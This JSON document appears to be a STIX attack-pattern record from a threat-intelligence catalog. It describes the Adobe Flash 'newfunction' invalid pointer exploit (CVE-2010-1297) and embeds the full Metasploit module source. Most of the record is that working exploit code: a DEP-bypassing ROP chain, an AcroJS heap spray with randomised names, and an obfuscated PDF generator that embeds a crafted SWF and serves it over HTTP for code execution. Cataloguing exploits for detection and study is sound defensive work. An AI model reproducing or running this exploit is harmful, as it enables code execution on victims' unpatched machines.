{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e17aeeed-6563-499e-8635-37df97640342",
    "created": "2024-08-14T16:43:49.683133Z",
    "modified": "2024-08-14T16:43:49.683138Z",
    "name": "Adobe Flash Player \"newfunction\" Invalid Pointer Use",
    "description": " This module exploits a vulnerability in the DoABC tag handling within versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat are also vulnerable, as are any other applications that may embed Flash player.  Arbitrary code execution is achieved by embedding a specially crafted Flash movie into a PDF document. An AcroJS heap spray is used in order to ensure that the memory used by the invalid pointer issue is controlled.  NOTE: This module uses a similar DEP bypass method to that used within the adobe_libtiff module. This method is unlikely to work across various Windows versions due a hardcoded syscall number.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flashplayer_newfunction.rb",
            "external_id": "adobe_flashplayer_newfunction.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1297"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/advisories/apsa10-01.html"
        },
        {
            "source_name": "reference",
            "url": "http://feliam.wordpress.com/2010/02/11/flash-on-a-pdf-with-minipdf-py/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Flash Player \"newfunction\" Invalid Pointer Use',\n      'Description'    => %q{\n          This module exploits a vulnerability in the DoABC tag handling within\n        versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat are also\n        vulnerable, as are any other applications that may embed Flash player.\n\n        Arbitrary code execution is achieved by embedding a specially crafted Flash\n        movie into a PDF document. An AcroJS heap spray is used in order to ensure\n        that the memory used by the invalid pointer issue is controlled.\n\n        NOTE: This module uses a similar DEP bypass method to that used within the\n        adobe_libtiff module. This method is unlikely to work across various\n        Windows versions due a hardcoded syscall number.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',   # Found being openly exploited\n          'jduck'      # Metasploit version\n        ],\n      'References'     =>\n        [\n          ['CVE', '2010-1297'],\n          ['OSVDB', '65141'],\n          ['BID', '40586'],\n          ['URL', 'http://www.adobe.com/support/security/advisories/apsa10-01.html'],\n          # For SWF->PDF embedding\n          ['URL', 'http://feliam.wordpress.com/2010/02/11/flash-on-a-pdf-with-minipdf-py/']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'          => 'process',\n          'HTTP::compression' => 'gzip',\n          'HTTP::chunked'     => true,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK via Adobe Reader 9.3.0 on Windows XP SP3 (uses flash 10.0.42.34) -jjd\n          # Tested OK via Adobe Reader 9.3.1 on Windows XP SP3 (uses flash 10.0.45.2) -jjd\n          # Tested OK via Adobe Reader 9.3.2 on Windows XP SP3 (uses flash 10.0.45.2) -jjd\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2010-06-04',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    # load the static swf file\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2010-1297.swf\" )\n    fd = File.open( path, \"rb\" )\n    @swf_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n\n    print_status(\"Sending crafted PDF w/SWF\")\n\n    js_data = make_js(regenerate_payload(cli).encoded)\n    pdf_data = make_pdf(@swf_data, js_data)\n    send_response(cli, pdf_data, { 'Content-Type' => 'application/pdf', 'Pragma' => 'no-cache' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n\n  def make_js(encoded_payload)\n\n    # The following executes a ret2lib using BIB.dll\n    # The effect is to bypass DEP and execute the shellcode in an indirect way\n    stack_data = [\n      0xc0c0c0c,\n      0x7004919,      # pop ecx / pop ecx / mov [eax+0xc0],1 / pop esi / pop ebx / ret\n      0xcccccccc,\n      0x70048ef,      # xchg eax,esp / ret\n      0x700156f,      # mov eax,[ecx+0x34] / push [ecx+0x24] / call [eax+8]\n      0xcccccccc,\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009033,      # ret 0x18\n      0x7009084,      # ret\n      0xc0c0c0c,\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7009084,      # ret\n      0x7001599,      # pop ebp / ret\n      0x10124,\n      0x70072f7,      # pop eax / ret\n      0x10104,\n      0x70015bb,      # pop ecx / ret\n      0x1000,\n      0x700154d,      # mov [eax], ecx / ret\n      0x70015bb,      # pop ecx / ret\n      0x7ffe0300,     # -- location of KiFastSystemCall\n      0x7007fb2,      # mov eax, [ecx] / ret\n      0x70015bb,      # pop ecx / ret\n      0x10011,\n      0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret\n      0x70015bb,      # pop ecx / ret\n      0x10100,\n      0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret\n      0x70072f7,      # pop eax / ret\n      0x10011,\n      0x70052e2,      # call [eax] / ret -- (KiFastSystemCall - VirtualAlloc?)\n      0x7005c54,      # pop esi / add esp,0x14 / ret\n      0xffffffff,\n      0x10100,\n      0x0,\n      0x10104,\n      0x1000,\n      0x40,\n      # The next bit effectively copies data from the interleaved stack to the memory\n      # pointed to by eax\n      # The data copied is:\n      # \\x5a\\x90\\x54\\x90\\x5a\\xeb\\x15\\x58\\x8b\\x1a\\x89\\x18\\x83\\xc0\\x04\\x83\n      # \\xc2\\x04\\x81\\xfb\\x0c\\x0c\\x0c\\x0c\\x75\\xee\\xeb\\x05\\xe8\\xe6\\xff\\xff\n      # \\xff\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xff\\xff\\xff\\x90\n      0x700d731,      # mov eax, [ebp-0x24] / ret\n      0x70015bb,      # pop ecx / ret\n      0x9054905a,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x5815eb5a,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x18891a8b,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x8304c083,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xfb8104c2,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xc0c0c0c,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x5ebee75,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xffffe6e8,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x909090ff,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x90909090,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x90909090,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x90ffffff,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700d731,      # mov eax, [ebp-0x24] / ret\n      0x700112f       # call eax -- (execute stub to transition to full shellcode)\n    ].pack('V*')\n\n    var_unescape  = rand_text_alpha(rand(100) + 1)\n    var_shellcode = rand_text_alpha(rand(100) + 1)\n\n    var_start     = rand_text_alpha(rand(100) + 1)\n\n    var_s         = 0x10000\n    var_c         = rand_text_alpha(rand(100) + 1)\n    var_b         = rand_text_alpha(rand(100) + 1)\n    var_d         = rand_text_alpha(rand(100) + 1)\n    var_3         = rand_text_alpha(rand(100) + 1)\n    var_i         = rand_text_alpha(rand(100) + 1)\n    var_4         = rand_text_alpha(rand(100) + 1)\n\n    payload_buf = ''\n    payload_buf << stack_data\n    payload_buf << encoded_payload\n\n    escaped_payload = Rex::Text.to_unescape(payload_buf)\n\n    js = %Q|\nvar #{var_unescape} = unescape;\nvar #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );\nvar #{var_c} = #{var_unescape}( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );\nwhile (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};\n#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);\n#{var_b} += #{var_shellcode};\n#{var_b} += #{var_c};\n#{var_d} = #{var_b}.substring(0, #{var_s}/2);\nwhile(#{var_d}.length < 0x80000) #{var_d} += #{var_d};\n#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);\nvar #{var_4} = new Array();\nfor (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+\"s\";\n|\n\n    js\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n\n  def make_pdf(swf, js)\n\n    swf_name = rand_text_alpha(8 + rand(8)) + \".swf\"\n\n    xref = []\n    eol = \"\\n\"\n    endobj = \"endobj\" << eol\n\n    # Randomize PDF version?\n    pdf = \"%PDF-1.5\" << eol\n    #pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    # catalog\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<</Type/Catalog\")\n    pdf << n_obfu(\"/Pages \") << io_ref(3)\n    pdf << n_obfu(\"/OpenAction \") << io_ref(5)\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # pages array\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Pages/Count 1/Kids [\") << io_ref(4) << n_obfu(\"]>>\") << eol << endobj\n\n    # page 1\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Page/Parent \") << io_ref(3)\n    pdf << n_obfu(\"/Annots [\") << io_ref(7) << n_obfu(\"] \")\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # js action\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(6) + \">>\" << eol << endobj\n\n    # js stream\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))\n    pdf << io_def(6) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    # swf annotation object\n    xref << pdf.length\n    pdf << io_def(7) << n_obfu(\"<</Type/Annot/Subtype/RichMedia\")\n    pdf << n_obfu(\"/Rect [20 20 187 69] \")\n    pdf << n_obfu(\"/RichMediaSettings \") << io_ref(8)\n    pdf << n_obfu(\"/RichMediaContent \") << io_ref(9)\n    pdf << n_obfu(\"/NM (\") << swf_name << n_obfu(\")\")\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # rich media settings\n    xref << pdf.length\n    pdf << io_def(8)\n    pdf << n_obfu(\"<</Type/RichMediaSettings/Subtype/Flash\")\n    pdf << n_obfu(\"/Activation \") << io_ref(10)\n    pdf << n_obfu(\"/Deactivation \") << io_ref(11)\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # rich media content\n    xref << pdf.length\n    pdf << io_def(9)\n    pdf << n_obfu(\"<</Type/RichMediaContent\")\n    pdf << n_obfu(\"/Assets \") << io_ref(12)\n    pdf << n_obfu(\"/Configurations [\") << io_ref(14) << \"]\"\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # rich media activation / deactivation\n    xref << pdf.length\n    pdf << io_def(10)\n    pdf << n_obfu(\"<</Type/RichMediaActivation/Condition/PO>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(11)\n    pdf << n_obfu(\"<</Type/RichMediaDeactivation/Condition/XD>>\")\n    pdf << eol << endobj\n\n    # rich media assets\n    xref << pdf.length\n    pdf << io_def(12)\n    pdf << n_obfu(\"<</Names [(#{swf_name}) \") << io_ref(13) << n_obfu(\"]>>\")\n    pdf << eol << endobj\n\n    # swf embeded file ref\n    xref << pdf.length\n    pdf << io_def(13)\n    pdf << n_obfu(\"<</Type/Filespec /EF <</F \") << io_ref(16) << n_obfu(\">> /F(#{swf_name})>>\")\n    pdf << eol << endobj\n\n    # rich media configuration\n    xref << pdf.length\n    pdf << io_def(14)\n    pdf << n_obfu(\"<</Type/RichMediaConfiguration/Subtype/Flash\")\n    pdf << n_obfu(\"/Instances [\") << io_ref(15) << n_obfu(\"]>>\")\n    pdf << eol << endobj\n\n    # rich media isntance\n    xref << pdf.length\n    pdf << io_def(15)\n    pdf << n_obfu(\"<</Type/RichMediaInstance/Subtype/Flash\")\n    pdf << n_obfu(\"/Asset \") << io_ref(13)\n    pdf << n_obfu(\">>\")\n    pdf << eol << endobj\n\n    # swf stream\n    # NOTE: This data is already compressed, no need to compress it again...\n    xref << pdf.length\n    pdf << io_def(16) << n_obfu(\"<</Type/EmbeddedFile/Length %s>>\" % swf.length) << eol\n    pdf << \"stream\" << eol\n    pdf << swf << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    # trailing stuff\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n\n    pdf << \"trailer\" << eol\n    pdf << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n\n    pdf << \"%%EOF\" << eol\n    pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-04",
    "x_mitre_platforms": [
        "win'"
    ]
}